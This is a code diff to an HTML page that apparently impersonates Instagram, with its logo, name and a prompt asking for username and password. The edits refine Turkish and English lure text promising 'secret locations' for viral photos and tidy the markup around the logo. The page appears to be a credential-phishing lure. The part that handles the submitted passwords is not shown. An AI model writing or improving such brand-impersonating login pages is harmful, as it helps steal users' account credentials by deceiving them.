@@ -91,7 +91,7 @@
         <circle cx="347" cy="165" r="6"/>
       </g>
     </svg>
-    Instagram<br>📸 fotoğraflar için<br>📍konumları keşfet
+    Instagram<br>📸 fotoğraflar için<br>📍 gizli konumları<br>keşfet
   </h1>
 
   <p id="subtitle">Kullanıcı adı ve şifrenizi girin:</p>
@@ -111,7 +111,7 @@
     const lang = navigator.language || navigator.userLanguage;
 
     if (!lang.startsWith('tr')) {
-      document.getElementById('title').innerHTML = `
+      document.getElementById('title').innerHTML = `Discover🔍🌍<br> secret locations📍<br>for your next viral🔥 
         <svg class="instagram-logo" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
           <radialGradient id="a" cx=".4" cy="1" r="1">
             <stop offset=".1" stop-color="#fd5"/><stop offset=".5" stop-color="#ff543e"/><stop offset="1" stop-color="#c837ab"/>
@@ -127,7 +127,8 @@
             <circle cx="256" cy="256" r="72"/>
             <circle cx="347" cy="165" r="6"/>
           </g>
-        Discover🔍🌍 secret locations📍 for your next viral🔥 </svg> Instagram shot 📸
+        </svg>
+        Instagram shot 📸!
       `;
       document.getElementById('subtitle').textContent = 'Enter your username and password:';
       document.getElementById('usernameInput').placeholder = 'Username';
